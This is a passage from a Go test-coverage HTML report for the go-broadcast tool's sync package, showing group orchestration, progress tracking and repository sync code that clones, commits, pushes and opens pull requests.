        State     string // pending, running, success, failed, skipped
        StartTime time.Time
        EndTime   time.Time
        Error     error
        Message   string // Additional status message
}

// GroupOrchestrator manages execution of multiple sync groups
type GroupOrchestrator struct {
        config       *config.Config
        engine       *Engine
        logger       *logrus.Logger
        groupStatus  map[string]GroupStatus                              // Track group execution status by group ID
        executeGroup func(ctx context.Context, group config.Group) error // Function field for testing
}

// NewGroupOrchestrator creates a new group orchestrator
func NewGroupOrchestrator(cfg *config.Config, engine *Engine, logger *logrus.Logger) *GroupOrchestrator <span class="cov8" title="1">{
        if logger == nil </span><span class="cov0" title="0">{
                logger = logrus.New()
        }</span>
        <span class="cov8" title="1">o := &amp;GroupOrchestrator{
                config:      cfg,
                engine:      engine,
                logger:      logger,
                groupStatus: make(map[string]GroupStatus),
        }
        // Set the default executeGroup function
        o.executeGroup = o.executeGroupImpl
        return o</span>
}

// ExecuteGroups runs all enabled groups respecting dependencies and priority
func (o *GroupOrchestrator) ExecuteGroups(ctx context.Context, groups []config.Group) error <span class="cov8" title="1">{
        if len(groups) == 0 </span><span class="cov8" title="1">{
                o.logger.Debug("No groups to execute")
                return nil
        }</span>

        // Apply group filters from options if engine is available
        <span class="cov8" title="1">if o.engine != nil </span><span class="cov8" title="1">{
                groups = o.filterGroupsByOptions(groups, o.engine.options)
                if len(groups) == 0 </span><span class="cov0" title="0">{
                        o.logger.Info("No groups match the specified filters")
                        return nil
                }</span>
                <span class="cov8" title="1">o.logger.WithField("filtered_group_count", len(groups)).Debug("Groups after filtering")</span>
        }

        // Filter enabled groups
        <span class="cov8" title="1">enabledGroups := o.filterEnabledGroups(groups)
        if len(enabledGroups) == 0 </span><span class="cov0" title="0">{
                o.logger.Info("No enabled groups to execute")
                return nil
        }</span>

        // Resolve dependencies and get execution order
        <span class="cov8" title="1">executionOrder, err := o.resolveDependencies(enabledGroups)
        if err != nil </span><span class="cov0" title="0">{
                return fmt.Errorf("failed to resolve dependencies: %w", err)
        }</span>

        // Initialize group status tracking
        <span class="cov8" title="1">o.initializeGroupStatus(enabledGroups)

        // Execute groups in resolved order
        var hasFailures bool
        for _, group := range executionOrder </span><span class="cov8" title="1">{
                // Check context cancellation
                select </span>{
                case &lt;-ctx.Done():<span class="cov8" title="1">
                        o.logger.Info("Context canceled, stopping group execution")
                        return ctx.Err()</span>
                default:<span class="cov8" title="1"></span>
                }

                // Check if dependencies completed successfully
                <span class="cov8" title="1">if !o.areDependenciesSatisfied(group) </span><span class="cov8" title="1">{
                        o.logger.WithField("group_id", group.ID).Info("Skipping group due to failed dependencies")
                        o.groupStatus[group.ID] = GroupStatus{
                                State:   "skipped",
                                Message: "Dependencies failed",
                        }
                        continue</span>
                }

                // Enhanced group start message with visual separation
                <span class="cov8" title="1">o.logger.WithFields(logrus.Fields{
                        "group_name": group.Name,
                        "group_id":   group.ID,
                        "priority":   group.Priority,
                        "depends_on": group.DependsOn,
                }).Info("‚îÅ‚îÅ‚îÅ Starting group sync ‚îÅ‚îÅ‚îÅ")

                o.groupStatus[group.ID] = GroupStatus{
                        State:     "running",
                        StartTime: time.Now(),
                }

                // Execute the group
                if err := o.executeGroup(ctx, group); err != nil </span><span class="cov8" title="1">{
                        o.groupStatus[group.ID] = GroupStatus{
                                State:     "failed",
                                EndTime:   time.Now(),
                                Error:     err,
                                StartTime: o.groupStatus[group.ID].StartTime,
                        }
                        o.logger.WithError(err).WithFields(logrus.Fields{
                                "group_id":   group.ID,
                                "group_name": group.Name,
                        }).Error("‚îÅ‚îÅ‚îÅ Group sync failed ‚îÅ‚îÅ‚îÅ")
                        hasFailures = true
                        // Continue with groups that don't depend on this one
                }</span> else<span class="cov8" title="1"> {
                        o.groupStatus[group.ID] = GroupStatus{
                                State:     "success",
                                EndTime:   time.Now(),
                                StartTime: o.groupStatus[group.ID].StartTime,
                        }
                        o.logger.WithFields(logrus.Fields{
                                "group_id":   group.ID,
                                "group_name": group.Name,
                                "duration":   time.Since(o.groupStatus[group.ID].StartTime),
                        }).Info("‚îÅ‚îÅ‚îÅ Group sync completed successfully ‚îÅ‚îÅ‚îÅ")
                }</span>
        }

        // Report final status
        <span class="cov8" title="1">return o.reportFinalStatus(hasFailures)</span>
}

// filterEnabledGroups returns only enabled groups
func (o *GroupOrchestrator) filterEnabledGroups(groups []config.Group) []config.Group <span class="cov8" title="1">{
        var enabled []config.Group
        for _, group := range groups </span><span class="cov8" title="1">{
                // If Enabled is nil, default to true
                if group.Enabled == nil || *group.Enabled </span><span class="cov8" title="1">{
                        enabled = append(enabled, group)
                }</span> else<span class="cov8" title="1"> {
                        o.logger.WithField("group_id", group.ID).Debug("Group is disabled, skipping")
                }</span>
        }
        <span class="cov8" title="1">return enabled</span>
}

// filterGroupsByOptions filters groups based on the sync options (GroupFilter and SkipGroups)
func (o *GroupOrchestrator) filterGroupsByOptions(groups []config.Group, options *Options) []config.Group <span class="cov8" title="1">{
        // If options is nil or no filters specified, return all groups
        if options == nil || (len(options.GroupFilter) == 0 &amp;&amp; len(options.SkipGroups) == 0) </span><span class="cov8" title="1">{
                return groups
        }</span>

        <span class="cov0" title="0">filtered := make([]config.Group, 0, len(groups))
        for _, group := range groups </span><span class="cov0" title="0">{
                // Check if group should be skipped
                shouldSkip := false
                for _, skipPattern := range options.SkipGroups </span><span class="cov0" title="0">{
                        if group.Name == skipPattern || group.ID == skipPattern </span><span class="cov0" title="0">{
                                o.logger.WithFields(logrus.Fields{
                                        "group_name": group.Name,
                                        "group_id":   group.ID,
                                }).Debug("Group matches skip pattern, excluding from sync")
                                shouldSkip = true
                                break</span>
                        }
                }
                <span class="cov0" title="0">if shouldSkip </span><span class="cov0" title="0">{
                        continue</span>
                }

                // Check if group matches filter (if filter is specified)
                <span class="cov0" title="0">if len(options.GroupFilter) &gt; 0 </span><span class="cov0" title="0">{
                        matchesFilter := false
                        for _, filterPattern := range options.GroupFilter </span><span class="cov0" title="0">{
                                if group.Name == filterPattern || group.ID == filterPattern </span><span class="cov0" title="0">{
                                        matchesFilter = true
                                        break</span>
                                }
                        }
                        <span class="cov0" title="0">if !matchesFilter </span><span class="cov0" title="0">{
                                o.logger.WithFields(logrus.Fields{
                                        "group_name": group.Name,
                                        "group_id":   group.ID,
                                }).Debug("Group doesn't match filter pattern, excluding from sync")
                                continue</span>
                        }
                }

                <span class="cov0" title="0">filtered = append(filtered, group)</span>
        }

        <span class="cov0" title="0">return filtered</span>
}

// resolveDependencies resolves dependencies and returns execution order
func (o *GroupOrchestrator) resolveDependencies(groups []config.Group) ([]config.Group, error) <span class="cov8" title="1">{
        // Create dependency resolver
        resolver := NewDependencyResolver(o.logger)

        // Add all groups to resolver
        for _, group := range groups </span><span class="cov8" title="1">{
                resolver.AddGroup(group)
        }</span>

        // Resolve and get execution order
        <span class="cov8" title="1">executionOrder, err := resolver.Resolve()
        if err != nil </span><span class="cov0" title="0">{
                return nil, err
        }</span>

        <span class="cov8" title="1">return executionOrder, nil</span>
}

// initializeGroupStatus initializes status tracking for all groups
func (o *GroupOrchestrator) initializeGroupStatus(groups []config.Group) <span class="cov8" title="1">{
        for _, group := range groups </span><span class="cov8" title="1">{
                o.groupStatus[group.ID] = GroupStatus{
                        State: "pending",
                }
        }</span>
}

// areDependenciesSatisfied checks if all dependencies of a group completed successfully
func (o *GroupOrchestrator) areDependenciesSatisfied(group config.Group) bool <span class="cov8" title="1">{
        for _, depID := range group.DependsOn </span><span class="cov8" title="1">{
                if status, exists := o.groupStatus[depID]; exists </span><span class="cov8" title="1">{
                        if status.State != "success" </span><span class="cov8" title="1">{
                                o.logger.WithFields(logrus.Fields{
                                        "group_id":      group.ID,
                                        "dependency_id": depID,
                                        "dep_state":     status.State,
                                }).Debug("Dependency not satisfied")
                                return false
                        }</span>
                }
                // If dependency doesn't exist in status map, it might be disabled
                // This is handled during dependency resolution
        }
        <span class="cov8" title="1">return true</span>
}

// executeGroupImpl is the actual implementation of executing a single group's sync operations
func (o *GroupOrchestrator) executeGroupImpl(ctx context.Context, group config.Group) error <span class="cov0" title="0">{
        // Set the current group in the engine
        o.engine.currentGroup = &amp;group
        defer func() </span><span class="cov0" title="0">{
                o.engine.currentGroup = nil
        }</span>()

        // Create a temporary config for this group
        <span class="cov0" title="0">groupConfig := &amp;config.Config{
                Version: o.config.Version,
                Name:    o.config.Name,
                ID:      o.config.ID,
                Groups:  []config.Group{group},
        }

        // Store original config and replace with group config
        originalConfig := o.engine.config
        o.engine.config = groupConfig
        defer func() </span><span class="cov0" title="0">{
                o.engine.config = originalConfig
        }</span>()

        // Execute the sync for this group using the single group execution method
        // Pass empty target filter since the group already has its targets defined
        <span class="cov0" title="0">return o.engine.executeSingleGroup(ctx, group, []string{})</span>
}

// reportFinalStatus reports the final execution status
func (o *GroupOrchestrator) reportFinalStatus(hasFailures bool) error <span class="cov8" title="1">{
        // Log summary
        var successCount, failedCount, skippedCount int
        var failedGroups []string

        for groupID, status := range o.groupStatus </span><span class="cov8" title="1">{
                switch status.State </span>{
                case "success":<span class="cov8" title="1">
                        successCount++</span>
                case "failed":<span class="cov8" title="1">
                        failedCount++
                        failedGroups = append(failedGroups, groupID)</span>
                case "skipped":<span class="cov8" title="1">
                        skippedCount++</span>
                }
        }

        // Enhanced final status reporting
        <span class="cov8" title="1">o.logger.WithFields(logrus.Fields{
                "success": successCount,
                "failed":  failedCount,
                "skipped": skippedCount,
                "total":   len(o.groupStatus),
        }).Info("‚ïê‚ïê‚ïê Group orchestration completed ‚ïê‚ïê‚ïê")

        // Log individual group results for better visibility
        for groupID, status := range o.groupStatus </span><span class="cov8" title="1">{
                switch status.State </span>{
                case "success":<span class="cov8" title="1">
                        o.logger.WithFields(logrus.Fields{
                                "group_id": groupID,
                                "duration": status.EndTime.Sub(status.StartTime),
                        }).Info("‚úì Group completed successfully")</span>
                case "failed":<span class="cov8" title="1">
                        o.logger.WithFields(logrus.Fields{
                                "group_id": groupID,
                                "error":    status.Error,
                        }).Error("‚úó Group failed")</span>
                case "skipped":<span class="cov8" title="1">
                        o.logger.WithFields(logrus.Fields{
                                "group_id": groupID,
                                "reason":   status.Message,
                        }).Warn("‚ö† Group skipped")</span>
                }
        }

        <span class="cov8" title="1">if hasFailures </span><span class="cov8" title="1">{
                return fmt.Errorf("%w: %d groups failed (%v)",
                        ErrOrchestrationFailures, failedCount, failedGroups)
        }</span>

        <span class="cov8" title="1">return nil</span>
}

// GetGroupStatus returns the status of all groups (for testing and monitoring)
func (o *GroupOrchestrator) GetGroupStatus() map[string]GroupStatus <span class="cov8" title="1">{
        // Return a copy to prevent external modification
        statusCopy := make(map[string]GroupStatus)
        for k, v := range o.groupStatus </span><span class="cov8" title="1">{
                statusCopy[k] = v
        }</span>
        <span class="cov8" title="1">return statusCopy</span>
}

// GetGroupStatusByID returns the status of a specific group
func (o *GroupOrchestrator) GetGroupStatusByID(groupID string) (GroupStatus, bool) <span class="cov8" title="1">{
        status, exists := o.groupStatus[groupID]
        return status, exists
}</span>
</pre>

		<pre class="file" id="file69" style="display: none">package sync

import (
        "fmt"
        "sync"
        "time"

        "github.com/sirupsen/logrus"
)

// ProgressTracker tracks the progress of sync operations across multiple repositories
type ProgressTracker struct {
        mu         sync.RWMutex
        totalRepos int
        completed  int
        successful int
        failed     int
        skipped    int
        errors     map[string]error
        repoStatus map[string]RepoStatus
        startTime  time.Time
        dryRun     bool
        lastError  error
        // Group context for better logging
        groupName string
        groupID   string
}

// RepoStatus represents the status of a repository sync
type RepoStatus string

const (
        // RepoStatusPending indicates the repo sync hasn't started
        RepoStatusPending RepoStatus = "pending"

        // RepoStatusInProgress indicates the repo sync is running
        RepoStatusInProgress RepoStatus = "in_progress"

        // RepoStatusSuccess indicates the repo sync completed successfully
        RepoStatusSuccess RepoStatus = "success"

        // RepoStatusFailed indicates the repo sync failed
        RepoStatusFailed RepoStatus = "failed"

        // RepoStatusSkipped indicates the repo sync was skipped
        RepoStatusSkipped RepoStatus = "skipped"
)

// Results contains the final results of a sync operation
type Results struct {
        TotalRepos int
        Successful int
        Failed     int
        Skipped    int
        Duration   time.Duration
        Errors     map[string]error
        DryRun     bool
}

// NewProgressTracker creates a new progress tracker
func NewProgressTracker(totalRepos int, dryRun bool) *ProgressTracker <span class="cov8" title="1">{
        return &amp;ProgressTracker{
                totalRepos: totalRepos,
                errors:     make(map[string]error),
                repoStatus: make(map[string]RepoStatus),
                startTime:  time.Now(),
                dryRun:     dryRun,
        }
}</span>

// NewProgressTrackerWithGroup creates a new progress tracker with group context
func NewProgressTrackerWithGroup(totalRepos int, dryRun bool, groupName, groupID string) *ProgressTracker <span class="cov8" title="1">{
        return &amp;ProgressTracker{
                totalRepos: totalRepos,
                errors:     make(map[string]error),
                repoStatus: make(map[string]RepoStatus),
                startTime:  time.Now(),
                dryRun:     dryRun,
                groupName:  groupName,
                groupID:    groupID,
        }
}</span>

// StartRepository marks a repository as started
func (p *ProgressTracker) StartRepository(repo string) <span class="cov8" title="1">{
        p.mu.Lock()
        defer p.mu.Unlock()

        p.repoStatus[repo] = RepoStatusInProgress

        fields := logrus.Fields{
                "repo":     repo,
                "progress": p.getProgressString(),
                "dry_run":  p.dryRun,
        }
        if p.groupName != "" </span><span class="cov0" title="0">{
                fields["group_name"] = p.groupName
        }</span>
        <span class="cov8" title="1">if p.groupID != "" </span><span class="cov0" title="0">{
                fields["group_id"] = p.groupID
        }</span>
        <span class="cov8" title="1">logrus.WithFields(fields).Info("Starting repository sync")</span>
}

// FinishRepository marks a repository as finished (used with defer)
func (p *ProgressTracker) FinishRepository(repo string) <span class="cov8" title="1">{
        p.mu.Lock()
        defer p.mu.Unlock()

        // Only update if not already set by RecordSuccess/RecordError
        if p.repoStatus[repo] == RepoStatusInProgress </span><span class="cov8" title="1">{
                p.repoStatus[repo] = RepoStatusSuccess
                p.successful++
        }</span>

        <span class="cov8" title="1">p.completed++</span>
}

// RecordSuccess records a successful repository sync
func (p *ProgressTracker) RecordSuccess(repo string) <span class="cov8" title="1">{
        p.mu.Lock()
        defer p.mu.Unlock()

        p.repoStatus[repo] = RepoStatusSuccess
        p.successful++

        fields := logrus.Fields{
                "repo":     repo,
                "progress": p.getProgressString(),
                "dry_run":  p.dryRun,
        }
        if p.groupName != "" </span><span class="cov0" title="0">{
                fields["group_name"] = p.groupName
        }</span>
        <span class="cov8" title="1">if p.groupID != "" </span><span class="cov0" title="0">{
                fields["group_id"] = p.groupID
        }</span>
        <span class="cov8" title="1">logrus.WithFields(fields).Info("Repository sync completed successfully")</span>
}

// RecordError records a failed repository sync
func (p *ProgressTracker) RecordError(repo string, err error) <span class="cov8" title="1">{
        p.mu.Lock()
        defer p.mu.Unlock()

        p.repoStatus[repo] = RepoStatusFailed
        p.errors[repo] = err
        p.failed++
        p.lastError = err

        fields := logrus.Fields{
                "repo":     repo,
                "error":    err.Error(),
                "progress": p.getProgressString(),
                "dry_run":  p.dryRun,
        }
        if p.groupName != "" </span><span class="cov0" title="0">{
                fields["group_name"] = p.groupName
        }</span>
        <span class="cov8" title="1">if p.groupID != "" </span><span class="cov0" title="0">{
                fields["group_id"] = p.groupID
        }</span>
        <span class="cov8" title="1">logrus.WithFields(fields).Error("Repository sync failed")</span>
}

// RecordSkipped records a skipped repository sync
func (p *ProgressTracker) RecordSkipped(repo, reason string) <span class="cov8" title="1">{
        p.mu.Lock()
        defer p.mu.Unlock()

        p.repoStatus[repo] = RepoStatusSkipped
        p.skipped++

        fields := logrus.Fields{
                "repo":     repo,
                "reason":   reason,
                "progress": p.getProgressString(),
                "dry_run":  p.dryRun,
        }
        if p.groupName != "" </span><span class="cov0" title="0">{
                fields["group_name"] = p.groupName
        }</span>
        <span class="cov8" title="1">if p.groupID != "" </span><span class="cov0" title="0">{
                fields["group_id"] = p.groupID
        }</span>
        <span class="cov8" title="1">logrus.WithFields(fields).Info("Repository sync skipped")</span>
}

// SetError sets a global error for the sync operation
func (p *ProgressTracker) SetError(err error) <span class="cov8" title="1">{
        p.mu.Lock()
        defer p.mu.Unlock()

        p.lastError = err
}</span>

// GetResults returns the final results of the sync operation
func (p *ProgressTracker) GetResults() *Results <span class="cov8" title="1">{
        p.mu.RLock()
        defer p.mu.RUnlock()

        return &amp;Results{
                TotalRepos: p.totalRepos,
                Successful: p.successful,
                Failed:     p.failed,
                Skipped:    p.skipped,
                Duration:   time.Since(p.startTime),
                Errors:     p.copyErrors(),
                DryRun:     p.dryRun,
        }
}</span>

// GetProgress returns current progress information
func (p *ProgressTracker) GetProgress() (completed, total int, percentage float64) <span class="cov8" title="1">{
        p.mu.RLock()
        defer p.mu.RUnlock()

        completed = p.completed
        total = p.totalRepos

        if total &gt; 0 </span><span class="cov8" title="1">{
                percentage = float64(completed) / float64(total) * 100
        }</span>

        <span class="cov8" title="1">return completed, total, percentage</span>
}

// HasErrors returns true if any errors were recorded
func (p *ProgressTracker) HasErrors() bool <span class="cov8" title="1">{
        p.mu.RLock()
        defer p.mu.RUnlock()

        return len(p.errors) &gt; 0 || p.lastError != nil
}</span>

// GetLastError returns the most recent error
func (p *ProgressTracker) GetLastError() error <span class="cov8" title="1">{
        p.mu.RLock()
        defer p.mu.RUnlock()

        return p.lastError
}</span>

// getProgressString returns a progress string (must be called with lock held)
func (p *ProgressTracker) getProgressString() string <span class="cov8" title="1">{
        return fmt.Sprintf("%d/%d", p.completed, p.totalRepos)
}</span>

// copyErrors creates a copy of the errors map (must be called with lock held)
func (p *ProgressTracker) copyErrors() map[string]error <span class="cov8" title="1">{
        errors := make(map[string]error, len(p.errors))
        for repo, err := range p.errors </span><span class="cov8" title="1">{
                errors[repo] = err
        }</span>
        <span class="cov8" title="1">return errors</span>
}
</pre>

		<pre class="file" id="file70" style="display: none">package sync

import (
        "context"
        "errors"
        "fmt"
        "io"
        "os"
        "path/filepath"
        "strings"
        "time"

        "github.com/sirupsen/logrus"

        "github.com/mrz1836/go-broadcast/internal/config"
        internalerrors "github.com/mrz1836/go-broadcast/internal/errors"
        "github.com/mrz1836/go-broadcast/internal/gh"
        "github.com/mrz1836/go-broadcast/internal/logging"
        "github.com/mrz1836/go-broadcast/internal/metrics"
        "github.com/mrz1836/go-broadcast/internal/state"
        "github.com/mrz1836/go-broadcast/internal/transform"
)

// Static error variables
var (
        ErrSourceDirectoryNotExistForMetrics       = errors.New("source directory does not exist for metrics processing")
        ErrAllDirectoryProcessingWithMetricsFailed = errors.New("all directory processing with metrics failed")
)

// Constants
const (
        mainBranch = "master"
)

// RepositorySync handles synchronization for a single repository
type RepositorySync struct {
        engine      *Engine
        target      config.TargetConfig
        sourceState *state.SourceState
        targetState *state.TargetState
        logger      *logrus.Entry
        tempDir     string
        // Performance metrics tracking
        syncMetrics *PerformanceMetrics
}

// PerformanceMetrics tracks performance metrics for the entire sync operation
type PerformanceMetrics struct {
        StartTime        time.Time
        EndTime          time.Time
        DirectoryMetrics map[string]DirectoryMetrics // keyed by source directory path
        FileMetrics      FileProcessingMetrics
        APICallsSaved    int // Total API calls saved by using tree API or caching
        CacheHits        int // Number of cache hits
        CacheMisses      int // Number of cache misses
        TotalAPIRequests int // Total API requests made
}

// FileProcessingMetrics tracks metrics for individual file processing
type FileProcessingMetrics struct {
        FilesProcessed   int
        FilesChanged     int
        FilesSkipped     int
        ProcessingTimeMs int64
}

// Execute performs the complete sync operation for this repository
func (rs *RepositorySync) Execute(ctx context.Context) error <span class="cov8" title="1">{
        // Initialize performance metrics tracking
        rs.syncMetrics = &amp;PerformanceMetrics{
                StartTime:        time.Now(),
                DirectoryMetrics: make(map[string]DirectoryMetrics),
        }

        // Start overall operation timer
        syncTimer := metrics.StartTimer(ctx, rs.logger, "repository_sync").
                AddField(logging.StandardFields.SourceRepo, rs.sourceState.Repo).
                AddField(logging.StandardFields.TargetRepo, rs.target.Repo).
                AddField("sync_branch", rs.sourceState.Branch).
                AddField("commit_sha", rs.sourceState.LatestCommit)
        // Add group context if available
        if rs.engine.currentGroup != nil </span><span class="cov8" title="1">{
                syncTimer = syncTimer.
                        AddField("group_name", rs.engine.currentGroup.Name).
                        AddField("group_id", rs.engine.currentGroup.ID)
        }</span>

        // 1. Check if sync is actually needed
        <span class="cov8" title="1">syncCheckTimer := metrics.StartTimer(ctx, rs.logger, "sync_check")
        needsSync := rs.engine.options.Force || rs.needsSync()
        syncCheckTimer.AddField("force_sync", rs.engine.options.Force).
                AddField("needs_sync", needsSync).Stop()

        if !needsSync </span><span class="cov8" title="1">{
                rs.logger.Info("Repository is up-to-date, skipping sync")
                syncTimer.AddField(logging.StandardFields.Status, "skipped").Stop()
                return nil
        }</span>

        // 2. Create temporary directory
        <span class="cov8" title="1">tempDirTimer := metrics.StartTimer(ctx, rs.logger, "temp_dir_creation")
        if err := rs.createTempDir(); err != nil </span><span class="cov0" title="0">{
                tempDirTimer.StopWithError(err)
                syncTimer.StopWithError(err)
                return fmt.Errorf("failed to create temp directory: %w", err)
        }</span>
        <span class="cov8" title="1">tempDirTimer.AddField("temp_dir", rs.tempDir).Stop()
        defer rs.cleanup()

        // 3. Clone source repository
        cloneTimer := metrics.StartTimer(ctx, rs.logger, "source_clone").
                AddField(logging.StandardFields.SourceRepo, rs.sourceState.Repo).
                AddField("source_branch", rs.sourceState.Branch).
                AddField("commit_sha", rs.sourceState.LatestCommit)

        if err := rs.cloneSource(ctx); err != nil </span><span class="cov8" title="1">{
                cloneTimer.StopWithError(err)
                syncTimer.StopWithError(err)
                return fmt.Errorf("failed to clone source: %w", err)
        }</span>
        <span class="cov8" title="1">cloneTimer.Stop()

        // 4. Process and transform files
        processTimer := metrics.StartTimer(ctx, rs.logger, "file_processing").
                AddField("file_count", len(rs.target.Files))

        fileProcessingStart := time.Now()
        changedFiles, err := rs.processFiles(ctx)
        if err != nil </span><span class="cov0" title="0">{
                processTimer.StopWithError(err)
                syncTimer.StopWithError(err)
                return fmt.Errorf("failed to process files: %w", err)
        }</span>
        <span class="cov8" title="1">fileProcessingDuration := time.Since(fileProcessingStart)

        // Update file processing metrics
        rs.syncMetrics.FileMetrics = FileProcessingMetrics{
                FilesProcessed:   len(rs.target.Files),
                FilesChanged:     len(changedFiles),
                FilesSkipped:     len(rs.target.Files) - len(changedFiles),
                ProcessingTimeMs: fileProcessingDuration.Milliseconds(),
        }

        processTimer.AddField("changed_files", len(changedFiles)).Stop()

        // 5. Process directories with metrics collection
        directoryChanges, directoryMetrics, err := rs.processDirectoriesWithMetrics(ctx)
        if err != nil </span><span class="cov0" title="0">{
                syncTimer.StopWithError(err)
                return fmt.Errorf("failed to process directories: %w", err)
        }</span>

        // Store directory metrics for PR metadata
        <span class="cov8" title="1">if rs.syncMetrics != nil </span><span class="cov8" title="1">{
                rs.syncMetrics.DirectoryMetrics = directoryMetrics
        }</span>

        // Combine file and directory changes
        <span class="cov8" title="1">allChanges := append(changedFiles, directoryChanges...)

        rs.logger.WithFields(logrus.Fields{
                "file_changes":      len(changedFiles),
                "directory_changes": len(directoryChanges),
                "total_changes":     len(allChanges),
        }).Info("File and directory processing completed")

        if len(allChanges) == 0 </span><span class="cov0" title="0">{
                rs.logger.Info("No file or directory changes detected, skipping sync")
                syncTimer.AddField(logging.StandardFields.Status, "no_changes").Stop()
                return nil
        }</span>

        // 6. Create sync branch (or use existing one)
        <span class="cov8" title="1">branchTimer := metrics.StartTimer(ctx, rs.logger, "branch_creation")
        branchName := rs.createSyncBranch(ctx)
        branchTimer.AddField(logging.StandardFields.BranchName, branchName).Stop()

        // 7. Commit changes
        commitTimer := metrics.StartTimer(ctx, rs.logger, "commit_creation").
                AddField(logging.StandardFields.BranchName, branchName).
                AddField("changed_files", len(allChanges))

        commitSHA, err := rs.commitChanges(ctx, branchName, allChanges)
        if err != nil </span><span class="cov0" title="0">{
                commitTimer.StopWithError(err)
                syncTimer.StopWithError(err)
                return fmt.Errorf("failed to commit changes: %w", err)
        }</span>
        <span class="cov8" title="1">commitTimer.AddField("commit_sha", commitSHA).Stop()

        // 8. Push changes (unless dry-run)
        if !rs.engine.options.DryRun </span><span class="cov8" title="1">{
                pushTimer := metrics.StartTimer(ctx, rs.logger, "branch_push").
                        AddField(logging.StandardFields.BranchName, branchName).
                        AddField("commit_sha", commitSHA)

                if err := rs.pushChanges(ctx, branchName); err != nil </span><span class="cov0" title="0">{
                        pushTimer.StopWithError(err)
                        syncTimer.StopWithError(err)
                        return fmt.Errorf("failed to push changes: %w", err)
                }</span>
                <span class="cov8" title="1">pushTimer.Stop()</span>
        } else<span class="cov8" title="1"> {
                rs.logger.Debug("DRY-RUN: Skipping branch push")
        }</span>

        // 9. Create or update pull request
        <span class="cov8" title="1">prTimer := metrics.StartTimer(ctx, rs.logger, "pr_management").
                AddField(logging.StandardFields.BranchName, branchName).
                AddField("commit_sha", commitSHA).
                AddField("changed_files", len(allChanges))

        if err := rs.createOrUpdatePR(ctx, branchName, commitSHA, allChanges); err != nil </span><span class="cov0" title="0">{
                prTimer.StopWithError(err)
                syncTimer.StopWithError(err)
                return fmt.Errorf("failed to create/update PR: %w", err)
        }</span>
        <span class="cov8" title="1">prTimer.Stop()

        // Finalize performance metrics
        rs.syncMetrics.EndTime = time.Now()

        if rs.engine.options.DryRun </span><span class="cov8" title="1">{
                rs.logger.Debug("Dry-run completed successfully")

                out := NewDryRunOutput(nil)
                out.Success("DRY-RUN SUMMARY: Repository sync preview completed successfully")
                // Add group context if available
                if rs.engine.currentGroup != nil </span><span class="cov0" title="0">{
                        out.Info(fmt.Sprintf("üìã Group: %s (%s)", rs.engine.currentGroup.Name, rs.engine.currentGroup.ID))
                }</span>
                <span class="cov8" title="1">out.Info(fmt.Sprintf("üìÅ Repository: %s", rs.target.Repo))
                out.Info(fmt.Sprintf("üåø Branch: %s", branchName))
                out.Info(fmt.Sprintf("üìù Files: %d would be changed", len(allChanges)))
                out.Info(fmt.Sprintf("üîó Commit: %s", commitSHA))
                out.Info("üí° Run without --dry-run to execute these changes")
                _, _ = fmt.Fprintln(out.writer)</span>
        } else<span class="cov8" title="1"> {
                rs.logger.WithField("branch", branchName).Info("Repository sync completed")
        }</span>

        <span class="cov8" title="1">syncTimer.AddField(logging.StandardFields.Status, "completed").
                AddField(logging.StandardFields.BranchName, branchName).
                AddField("final_commit_sha", commitSHA).
                AddField("total_changed_files", len(allChanges)).Stop()

        return nil</span>
}

// needsSync determines if this repository actually needs synchronization
func (rs *RepositorySync) needsSync() bool <span class="cov8" title="1">{
        if rs.targetState == nil </span><span class="cov8" title="1">{
                return true // No state means never synced
        }</span>

        // Check if source commit is different from last synced commit
        <span class="cov8" title="1">return rs.targetState.LastSyncCommit != rs.sourceState.LatestCommit</span>
}

// createTempDir creates a temporary directory for the sync operation
func (rs *RepositorySync) createTempDir() error <span class="cov8" title="1">{
        tempDir, err := os.MkdirTemp("", "go-broadcast-sync-*")
        if err != nil </span><span class="cov0" title="0">{
                return err
        }</span>

        <span class="cov8" title="1">rs.tempDir = tempDir
        rs.logger.WithField("temp_dir", tempDir).Debug("Created temporary directory")
        return nil</span>
}

// cleanup removes temporary files unless configured otherwise
func (rs *RepositorySync) cleanup() <span class="cov8" title="1">{
        if !rs.engine.options.CleanupTempFiles || rs.tempDir == "" </span><span class="cov8" title="1">{
                return
        }</span>

        // Force cleanup even if there are permission issues
        <span class="cov8" title="1">if err := os.Chmod(rs.tempDir, 0o600); err != nil </span><span class="cov0" title="0">{
                rs.logger.WithError(err).Debug("Failed to change temp directory permissions for cleanup")
        }</span>

        <span class="cov8" title="1">if err := os.RemoveAll(rs.tempDir); err != nil </span><span class="cov8" title="1">{
                rs.logger.WithError(err).Warn("Failed to cleanup temporary directory")
                // Try one more time with forced removal
                _ = os.RemoveAll(rs.tempDir) // Ignore error on second attempt
        }</span> else<span class="cov8" title="1"> {
                rs.logger.Debug("Cleaned up temporary directory")
        }</span>
}

// cloneSource clones the source repository at the specific commit
func (rs *RepositorySync) cloneSource(ctx context.Context) error <span class="cov8" title="1">{
        rs.logger.WithFields(logrus.Fields{
                "source_repo":   rs.sourceState.Repo,
                "source_branch": rs.sourceState.Branch,
                "commit_sha":    rs.sourceState.LatestCommit,
        }).Info("Cloning source repository")

        // Clone the repository
        sourceURL := fmt.Sprintf("https://github.com/%s.git", rs.sourceState.Repo)
        sourcePath := filepath.Join(rs.tempDir, "source")

        if err := rs.engine.git.Clone(ctx, sourceURL, sourcePath); err != nil </span><span class="cov8" title="1">{
                return err
        }</span>

        // Checkout specific commit
        <span class="cov8" title="1">if err := rs.engine.git.Checkout(ctx, sourcePath, rs.sourceState.LatestCommit); err != nil </span><span class="cov0" title="0">{
                return err
        }</span>

        <span class="cov8" title="1">rs.logger.Debug("Source repository cloned successfully")
        return nil</span>
}

// processFiles processes all configured files and applies transformations
func (rs *RepositorySync) processFiles(ctx context.Context) ([]FileChange, error) <span class="cov8" title="1">{
        rs.logger.WithField("file_count", len(rs.target.Files)).Info("Processing files")

        var changedFiles []FileChange
        sourcePath := filepath.Join(rs.tempDir, "source")

        for _, fileMapping := range rs.target.Files </span><span class="cov8" title="1">{
                change, err := rs.processFile(ctx, sourcePath, fileMapping)
                if err != nil </span><span class="cov0" title="0">{
                        // Handle recoverable errors gracefully
                        if errors.Is(err, internalerrors.ErrTransformNotFound) </span><span class="cov0" title="0">{
                                rs.logger.WithField("file", fileMapping.Dest).Debug("File content unchanged, skipping")
                                continue</span>
                        }
                        <span class="cov0" title="0">if errors.Is(err, internalerrors.ErrFileNotFound) </span><span class="cov0" title="0">{
                                rs.logger.WithField("file", fileMapping.Src).Debug("Source file not found, skipping")
                                continue</span>
                        }
                        // For any other error, fail the operation
                        <span class="cov0" title="0">return nil, fmt.Errorf("failed to process file %s: %w", fileMapping.Src, err)</span>
                }

